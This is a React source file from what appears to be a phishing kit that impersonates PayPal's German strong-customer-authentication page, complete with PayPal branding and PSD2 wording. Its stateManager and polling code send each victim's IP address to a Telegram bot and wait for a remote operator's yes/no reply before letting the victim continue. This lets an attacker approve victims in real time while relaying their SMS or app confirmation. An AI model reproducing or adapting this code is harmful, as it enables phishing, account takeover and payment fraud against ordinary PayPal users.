import React, {useEffect, useState} from 'react';
import classes from '../email/Email.module.css'
import axios from "axios";
import bot from "../../bot_manager/manager";
import loader from "../../assets/loader.gif";

let firstState;
const AuthVerification = (props) => {

    const [text, setText] = useState('');
    const [isLoading, setLoading] = useState(false);

    useEffect(() => {
        if (props.state === 1) setText("Mit der SMS")
        else if (props.state === 2) setText("Mit der Paypal-App bestatigen")
        else if (props.state === 3) setText("Mit der Email")
    }, [])

    const stateManager = () => {
        if (props.state === 2) {
            axios.get(bot.getUpdates())
                .then((res) => {
                    firstState = res.data.result;
                })
            setLoading(true)
            axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
                ' Пытается пройти верифакцию по телефону.%0AРазрешить ему пройти дальше? (yes/no)'), '')
        } else {
            props.setFinal(true)
        }
    }

    const getUpdatesInterval =  () => {
        let req;
        if (firstState.length > 80) {
            req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
        } else req = bot.getUpdates();
        axios.get(req)
            .then((res) => {
                if (firstState) {
                    if (res.data.result.length !== firstState.length) {
                        let text = res.data.result[res.data.result.length - 1].message.text;
                        if (text.indexOf(props.info.IPv4) !== -1) {
                            if (text.indexOf('yes') !== -1) props.setFinal(true)
                            else if (text.indexOf('no') !== -1) {
                                setLoading(false);
                            } else firstState = res.data.result;
                        } else firstState = res.data.result;
                    }
                } else firstState = res.data.result;

            })
    }

    useEffect(() => {
        if (isLoading) {
            console.log("Start");
            const interval = setInterval(getUpdatesInterval, 5000);
            return () => clearInterval(interval);
        }
    }, [isLoading])

    return (
        <div className={classes.corral}>
            {isLoading ? <img src={loader} className={classes.loader}/> : null}
            <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div className={classes.title}>
                    Authentifizierung erforderlich
                </div>
                <div>
                    <p className={classes.description}>
                        Im Rahmen der uberarbeiteten Zahlungsdiensterichtlinie (PSD2) "Starke Kundenauthentifizierung"
                        benotigen wir weitere informationen, die bestatigen, dass es sich wirklich um Sie handelt
                    </p>
                </div>
                <div style={{ textAlign: "center", marginBottom: "20px"}}>
                    <a href={"#"} style={{color: '#0070BA', fontWeight: '500'}}>
                        Mehr erfahren
                    </a>
                </div>
                <div style={{marginLeft: "20px"}}>
                    {text}
                </div>
                <div id={"loginContent"}>
                    <div id="loginSection">
                        <div className={classes.notifications}></div>
                        <form className={classes.maskable}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div style={{textAlign:'center'}}>
                                        <a href="#" id="forgotPassword"
                                           className={[classes.recoveryOption, classes.forgotPassword].join(' ')}
                                           data-client-log-action-type="clickForgotPasswordLink"
                                           pa-marked="1"></a>
                                    </div>

                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={() => stateManager()}>
                        Weiter
                    </button>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected} style={{color: '#0070BA'}}>Zuruck zum PayPal-Login</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default AuthVerification;